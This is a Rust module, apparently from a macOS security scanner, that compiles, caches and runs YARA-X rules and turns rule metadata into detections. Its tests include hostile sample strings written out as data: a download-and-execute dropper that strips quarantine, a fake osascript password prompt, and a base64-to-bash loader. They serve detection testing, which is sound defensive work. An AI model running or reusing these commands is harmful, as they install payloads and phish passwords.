//! YARA-X rules: built-in rules + bundle `yara/*.yar`, compiled once and cached on disk.
//!
//! Every bundle file is first compiled on its own (includes disabled) so that one broken file is
//! skipped with a warning instead of breaking the whole set; the accepted files are then compiled
//! together, each in its own namespace (no identifier clashes between files). The compiled
//! [`yara_x::Rules`] are serialized to `cache_dir/yara-<key>.bin`, where the key hashes the YARA-X
//! version, the bundle version and every source, so restarts skip compilation.
//!
//! Rule metadata understood: `severity` (`info|low|medium|high|critical`, default `medium`),
//! `family` (detection name; default: rule identifier), `description` (details),
//! `confidence` (0..1 or 0..100), `engine = "heuristic"` (reported as [`DetectionEngine::Heuristic`]).

use pb_core::model::{Detection, DetectionEngine, Severity};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};
use std::time::Duration;

/// Built-in rules (always loaded).
pub(crate) const BUILTIN_RULES: &str = include_str!("builtin.yar");
const BUILTIN_NAMESPACE: &str = "builtin";
const MAX_RULE_FILES: usize = 10_000;
const MAX_RULE_FILE_BYTES: u64 = 16 * 1024 * 1024;
const MAX_CACHE_BYTES: u64 = 1024 * 1024 * 1024;
/// Per-file scan timeout.
pub(crate) const SCAN_TIMEOUT: Duration = Duration::from_secs(10);
/// Max detections reported per scanned buffer.
const MAX_DETECTIONS: usize = 32;

/// Compiled rule set.
pub(crate) struct YaraRules {
    pub rules: yara_x::Rules,
    /// Number of (non-private) rules, built-in included.
    pub count: u64,
    /// Bundle files rejected at compile time (`name: error`).
    pub skipped: Vec<String>,
}

struct Source {
    namespace: String,
    origin: String,
    bytes: Vec<u8>,
}

fn sanitize_namespace(stem: &str, idx: usize) -> String {
    let s: String = stem
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .take(48)
        .collect();
    format!("b{idx}_{s}")
}

fn bundle_sources(dir: &Path) -> Vec<Source> {
    let mut files: Vec<PathBuf> = match std::fs::read_dir(dir) {
        Ok(rd) => rd
            .filter_map(|e| e.ok())
            .map(|e| e.path())
            .filter(|p| {
                p.extension().and_then(|e| e.to_str()).is_some_and(|e| {
                    e.eq_ignore_ascii_case("yar") || e.eq_ignore_ascii_case("yara")
                }) && std::fs::symlink_metadata(p).is_ok_and(|m| m.is_file())
            })
            .collect(),
        Err(_) => return Vec::new(),
    };
    files.sort();
    if files.len() > MAX_RULE_FILES {
        tracing::warn!(
            count = files.len(),
            "too many YARA files, keeping the first {MAX_RULE_FILES}"
        );
        files.truncate(MAX_RULE_FILES);
    }
    let mut out = Vec::new();
    for (i, p) in files.into_iter().enumerate() {
        let origin = p
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();
        match std::fs::metadata(&p) {
            Ok(m) if m.len() > MAX_RULE_FILE_BYTES => {
                tracing::warn!(file = %origin, "YARA file too large, skipped");
                continue;
            }
            Err(e) => {
                tracing::warn!(file = %origin, error = %e, "cannot stat YARA file");
                continue;
            }
            _ => {}
        }
        match std::fs::read(&p) {
            Ok(bytes) => {
                let stem = p
                    .file_stem()
                    .map(|s| s.to_string_lossy().into_owned())
                    .unwrap_or_default();
                out.push(Source {
                    namespace: sanitize_namespace(&stem, i),
                    origin,
                    bytes,
                });
            }
            Err(e) => tracing::warn!(file = %origin, error = %e, "cannot read YARA file"),
        }
    }
    out
}

fn new_compiler<'a>() -> yara_x::Compiler<'a> {
    let mut c = yara_x::Compiler::new();
    c.enable_includes(false);
    c
}

/// Compiles one source alone; `Err` with the first error message if it does not compile.
fn validate(src: &Source) -> Result<(), String> {
    let mut c = new_compiler();
    c.add_source(yara_x::SourceCode::from(src.bytes.as_slice()).with_origin(src.origin.clone()))
        .map_err(|e| e.to_string())?;
    if let Some(e) = c.errors().first() {
        return Err(e.to_string());
    }
    Ok(())
}

fn cache_key(bundle_version: Option<&str>, sources: &[Source]) -> String {
    let mut h = Sha256::new();
    h.update(b"pb-yara-cache-v1\0");
    h.update(yara_x::VERSION.as_bytes());
    h.update([0]);
    h.update(bundle_version.unwrap_or("").as_bytes());
    h.update([0]);
    h.update(BUILTIN_RULES.as_bytes());
    for s in sources {
        h.update(s.namespace.as_bytes());
        h.update([0]);
        h.update((s.bytes.len() as u64).to_le_bytes());
        h.update(&s.bytes);
    }
    hex::encode(&h.finalize()[..12])
}

/// A cache file is only trusted if owned by us and not writable by group/others (compiled rules
/// contain native code: a tampered cache would be code execution in the daemon).
fn cache_file_is_safe(path: &Path) -> bool {
    use std::os::unix::fs::MetadataExt;
    let Ok(m) = std::fs::symlink_metadata(path) else {
        return false;
    };
    // SAFETY: geteuid has no preconditions and cannot fail.
    let euid = unsafe { libc::geteuid() };
    m.is_file() && m.uid() == euid && m.mode() & 0o022 == 0 && m.len() <= MAX_CACHE_BYTES
}

fn try_cache(path: &Path) -> Option<yara_x::Rules> {
    if !cache_file_is_safe(path) {
        return None;
    }
    let bytes = std::fs::read(path).ok()?;
    match yara_x::Rules::deserialize(bytes) {
        Ok(r) => Some(r),
        Err(e) => {
            tracing::warn!(error = %e, "discarding unreadable YARA cache");
            let _ = std::fs::remove_file(path);
            None
        }
    }
}

fn write_cache(cache_dir: &Path, path: &Path, rules: &yara_x::Rules) {
    let bytes = match rules.serialize() {
        Ok(b) => b,
        Err(e) => {
            tracing::warn!(error = %e, "cannot serialize YARA rules");
            return;
        }
    };
    let result = (|| -> std::io::Result<()> {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;
        std::fs::create_dir_all(cache_dir)?;
        let tmp = path.with_extension("bin.tmp");
        let _ = std::fs::remove_file(&tmp);
        let mut f = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o600)
            .open(&tmp)?;
        f.write_all(&bytes)?;
        f.sync_all()?;
        std::fs::rename(&tmp, path)?;
        Ok(())
    })();
    if let Err(e) = result {
        tracing::warn!(error = %e, "cannot write YARA cache");
        return;
    }
    // Drop caches of other rule sets.
    if let Ok(rd) = std::fs::read_dir(cache_dir) {
        for e in rd.flatten() {
            let p = e.path();
            let name = e.file_name().to_string_lossy().into_owned();
            if p != path && name.starts_with("yara-") && name.ends_with(".bin") {
                let _ = std::fs::remove_file(p);
            }
        }
    }
}

/// Loads built-in + bundle rules (`bundle_yara_dir` = `<bundle>/yara`), using the on-disk cache
/// when possible. Only a failure of the built-in rules is an error.
pub(crate) fn load(
    bundle_yara_dir: Option<&Path>,
    cache_dir: Option<&Path>,
    bundle_version: Option<&str>,
) -> Result<YaraRules, String> {
    let sources = bundle_yara_dir.map(bundle_sources).unwrap_or_default();
    let key = cache_key(bundle_version, &sources);
    let cache_path = cache_dir.map(|d| d.join(format!("yara-{key}.bin")));
    if let Some(p) = &cache_path {
        if let Some(rules) = try_cache(p) {
            let count = rules.iter().len() as u64;
            tracing::info!(rules = count, "YARA rules loaded from cache");
            return Ok(YaraRules {
                rules,
                count,
                skipped: Vec::new(),
            });
        }
    }

    let mut skipped = Vec::new();
    let mut accepted = Vec::new();
    for s in &sources {
        match validate(s) {
            Ok(()) => accepted.push(s),
            Err(e) => {
                tracing::warn!(file = %s.origin, error = %e, "YARA file rejected");
                skipped.push(format!("{}: {}", s.origin, e.lines().next().unwrap_or("")));
            }
        }
    }
    let mut c = new_compiler();
    c.new_namespace(BUILTIN_NAMESPACE);
    c.add_source(yara_x::SourceCode::from(BUILTIN_RULES).with_origin("builtin.yar"))
        .map_err(|e| format!("built-in rules: {e}"))?;
    for s in accepted {
        c.new_namespace(&s.namespace);
        if let Err(e) =
            c.add_source(yara_x::SourceCode::from(s.bytes.as_slice()).with_origin(s.origin.clone()))
        {
            tracing::warn!(file = %s.origin, error = %e, "YARA file failed in the combined build");
            skipped.push(format!(
                "{}: {}",
                s.origin,
                e.to_string().lines().next().unwrap_or("")
            ));
        }
    }
    let rules = c.build();
    let count = rules.iter().len() as u64;
    if let (Some(dir), Some(p)) = (cache_dir, &cache_path) {
        write_cache(dir, p, &rules);
    }
    tracing::info!(
        rules = count,
        files = sources.len(),
        rejected = skipped.len(),
        "YARA rules compiled"
    );
    Ok(YaraRules {
        rules,
        count,
        skipped,
    })
}

/// A scanner configured for engine use (timeout, fast scan, bounded matches).
pub(crate) fn new_scanner(rules: &yara_x::Rules) -> yara_x::Scanner<'_> {
    let mut s = yara_x::Scanner::new(rules);
    s.set_timeout(SCAN_TIMEOUT);
    s.fast_scan(true);
    s.max_matches_per_pattern(1000);
    s
}

fn parse_severity(s: &str) -> Severity {
    match s.trim().to_ascii_lowercase().as_str() {
        "info" | "informational" => Severity::Info,
        "low" => Severity::Low,
        "high" => Severity::High,
        "critical" => Severity::Critical,
        _ => Severity::Medium,
    }
}

/// Numeric severities used by community rule sets: Elastic `severity = 100` (0-100), Florian Roth's
/// signature-base `score = 0..100`. 70+ is a confident detection (`high`, malicious unless the file is
/// signed by a trusted developer), 40-69 `medium` (suspicious), below `low`.
fn severity_from_number(n: i64) -> Severity {
    match n {
        n if n >= 70 => Severity::High,
        n if n >= 40 => Severity::Medium,
        n if n >= 1 => Severity::Low,
        _ => Severity::Info,
    }
}

fn default_confidence(s: Severity) -> f32 {
    match s {
        Severity::Critical => 0.95,
        Severity::High => 0.9,
        Severity::Medium => 0.6,
        Severity::Low => 0.3,
        Severity::Info => 0.1,
    }
}

/// Scans a buffer; returns detections (or the scan error, e.g. timeout).
pub(crate) fn scan(
    scanner: &mut yara_x::Scanner<'_>,
    data: &[u8],
) -> Result<Vec<Detection>, String> {
    let results = scanner.scan(data).map_err(|e| e.to_string())?;
    let mut out = Vec::new();
    for rule in results.matching_rules() {
        if out.len() >= MAX_DETECTIONS {
            break;
        }
        let mut severity = Severity::Medium;
        // A textual `severity` wins over a numeric `severity`/`score`.
        let mut textual_severity = false;
        let mut family: Option<String> = None;
        let mut threat_name: Option<String> = None;
        let mut description: Option<String> = None;
        let mut confidence: Option<f32> = None;
        let mut heuristic = false;
        for (key, value) in rule.metadata() {
            match (key, value) {
                ("severity", yara_x::MetaValue::String(s)) => {
                    severity = parse_severity(s);
                    textual_severity = true;
                }
                ("severity" | "score", yara_x::MetaValue::Integer(i)) if !textual_severity => {
                    severity = severity_from_number(i)
                }
                ("threat_name", yara_x::MetaValue::String(s)) if !s.trim().is_empty() => {
                    threat_name = Some(s.trim().to_owned())
                }
                ("family", yara_x::MetaValue::String(s)) if !s.trim().is_empty() => {
                    family = Some(s.trim().to_owned())
                }
                ("description", yara_x::MetaValue::String(s)) if !s.trim().is_empty() => {
                    description = Some(s.trim().to_owned())
                }
                ("engine", yara_x::MetaValue::String(s)) => {
                    heuristic = s.eq_ignore_ascii_case("heuristic")
                }
                ("confidence", yara_x::MetaValue::Float(f)) => confidence = Some(f as f32),
                ("confidence", yara_x::MetaValue::Integer(i)) => confidence = Some(i as f32),
                _ => {}
            }
        }
        let confidence = confidence
            .map(|c| if c > 1.0 { c / 100.0 } else { c })
            .filter(|c| c.is_finite())
            .map(|c| c.clamp(0.0, 1.0))
            .unwrap_or_else(|| default_confidence(severity));
        let rule_ref = format!("rule {}:{}", rule.namespace(), rule.identifier());
        let details = match description {
            Some(d) => format!("{d} ({rule_ref})"),
            None => rule_ref,
        };
        out.push(Detection {
            engine: if heuristic {
                DetectionEngine::Heuristic
            } else {
                DetectionEngine::Yara
            },
            name: family
                .or(threat_name)
                .unwrap_or_else(|| rule.identifier().to_owned()),
            severity,
            confidence,
            details: Some(details),
        });
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    pub(crate) const EICAR: &[u8] =
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    #[test]
    fn builtin_rules_compile_and_detect() {
        let y = load(None, None, None).unwrap();
        assert_eq!(y.count, 4);
        let mut s = new_scanner(&y.rules);
        let d = scan(&mut s, EICAR).unwrap();
        assert_eq!(d.len(), 1);
        assert_eq!(d[0].name, "EICAR-Test-File");
        assert_eq!(d[0].severity, Severity::High);
        assert_eq!(d[0].engine, DetectionEngine::Yara);
        assert!(scan(&mut s, b"hello world").unwrap().is_empty());

        let dropper = b"#!/bin/bash\ncurl -sL https://x.example/p -o /tmp/p\nxattr -d com.apple.quarantine /tmp/p\nchmod +x /tmp/p\n/tmp/p\n";
        let d = scan(&mut s, dropper).unwrap();
        assert_eq!(d.len(), 1, "{d:?}");
        assert_eq!(d[0].engine, DetectionEngine::Heuristic);
        assert_eq!(d[0].severity, Severity::Medium);

        let phish = b"osascript -e 'display dialog \"Enter password\" default answer \"\" with hidden answer' ; dscl /Local/Default -authonly";
        assert_eq!(
            scan(&mut s, phish).unwrap()[0].name,
            "Heuristic.MacOS.PasswordPhishingDialog"
        );

        let blob = "QUJD".repeat(40);
        let loader = format!("echo '{blob}' | base64 -d | bash\n");
        assert_eq!(
            scan(&mut s, loader.as_bytes()).unwrap()[0].name,
            "Heuristic.MacOS.Base64ShellLoader"
        );
        // Homebrew-style installer: no detection.
        let brew = b"/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"";
        assert!(scan(&mut s, brew).unwrap().is_empty());
    }

    #[test]
    fn broken_file_is_skipped_and_cache_is_used() {
        let d = tempfile::tempdir().unwrap();
        let yd = d.path().join("yara");
        std::fs::create_dir_all(&yd).unwrap();
        std::fs::write(
            yd.join("good.yar"),
            "rule Good { meta: family = \"Test.Family\" severity = \"critical\" strings: $a = \"MAGIC-MARKER-123\" condition: $a }",
        )
        .unwrap();
        // Same identifier in another file: fine thanks to per-file namespaces.
        std::fs::write(
            yd.join("good2.yar"),
            "rule Good { strings: $a = \"OTHER-MARKER\" condition: $a }",
        )
        .unwrap();
        std::fs::write(yd.join("broken.yar"), "rule Broken { condition: $nope }").unwrap();
        std::fs::write(yd.join("notes.txt"), "not a rule").unwrap();
        let cache = d.path().join("cache");
        let y = load(Some(&yd), Some(&cache), Some("v1")).unwrap();
        assert_eq!(y.count, 6);
        assert_eq!(y.skipped.len(), 1);
        assert!(y.skipped[0].starts_with("broken.yar"));
        let mut s = new_scanner(&y.rules);
        let det = scan(&mut s, b"xx MAGIC-MARKER-123 xx").unwrap();
        assert_eq!(det[0].name, "Test.Family");
        assert_eq!(det[0].severity, Severity::Critical);
        let det = scan(&mut s, b"OTHER-MARKER").unwrap();
        assert_eq!(det[0].name, "Good");
        // Second load comes from the cache.
        let cached: Vec<_> = std::fs::read_dir(&cache).unwrap().flatten().collect();
        assert_eq!(cached.len(), 1);
        let y2 = load(Some(&yd), Some(&cache), Some("v1")).unwrap();
        assert_eq!(y2.count, 6);
        assert!(y2.skipped.is_empty());
        let mut s2 = new_scanner(&y2.rules);
        assert_eq!(scan(&mut s2, EICAR).unwrap()[0].name, "EICAR-Test-File");
    }

    #[test]
    fn numeric_severity_and_threat_name() {
        let src = "rule Elastic_Like { meta: threat_name = \"MacOS.Trojan.Test\" severity = 100 strings: $a = \"ELASTIC-MARKER-1\" condition: $a }\n\
                   rule SigBase_Like { meta: score = 60 strings: $a = \"SIGBASE-MARKER-2\" condition: $a }";
        let mut c = yara_x::Compiler::new();
        c.add_source(src).unwrap();
        let rules = c.build();
        let mut sc = yara_x::Scanner::new(&rules);
        let det = scan(&mut sc, b"xx ELASTIC-MARKER-1 SIGBASE-MARKER-2").unwrap();
        let e = det.iter().find(|d| d.name == "MacOS.Trojan.Test").unwrap();
        assert_eq!(e.severity, Severity::High);
        let s = det.iter().find(|d| d.name == "SigBase_Like").unwrap();
        assert_eq!(s.severity, Severity::Medium);
    }
}
